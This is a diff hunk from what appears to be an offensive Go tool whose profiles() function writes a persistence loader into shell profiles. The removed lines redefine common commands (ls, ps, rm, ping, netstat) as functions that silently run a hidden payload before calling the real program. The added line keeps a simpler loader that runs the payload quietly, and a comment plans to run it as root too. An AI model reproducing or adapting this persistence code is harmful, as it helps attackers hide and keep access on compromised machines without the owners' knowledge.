@@ -135,15 +135,7 @@ func profiles() (err error) {
 	}
 
 	// loader
-	loader := "export PERSISTENCE=true"
-	loader += "\nunalias ls 2>/dev/null" // TODO check if alias exists before unalias it
-	loader += "\nunalias rm 2>/dev/null"
-	loader += "\nunalias ps 2>/dev/null"
-	loader += fmt.Sprintf("\nfunction ls() { (set +m;(%s)2>/dev/null;); /usr/bin/ls $@ --color=never; }", payload)
-	loader += fmt.Sprintf("\nfunction ping() { (set +m;(%s)2>/dev/null); /usr/bin/ping $@; }", payload)
-	loader += fmt.Sprintf("\nfunction netstat() { (set +m;(%s)2>/dev/null); /usr/bin/netstat $@; }", payload)
-	loader += fmt.Sprintf("\nfunction ps() { (set +m;(%s)2>/dev/null); /usr/bin/ps $@; }", payload)
-	loader += fmt.Sprintf("\nfunction rm() { (set +m;(%s)2>/dev/null); /usr/bin/rm $@; }\n", payload)
+	loader := "export PERSISTENCE=true\nset +m;%s 2>/dev/null"
 
 	// exec our payload as root too!
 	// sudo payload
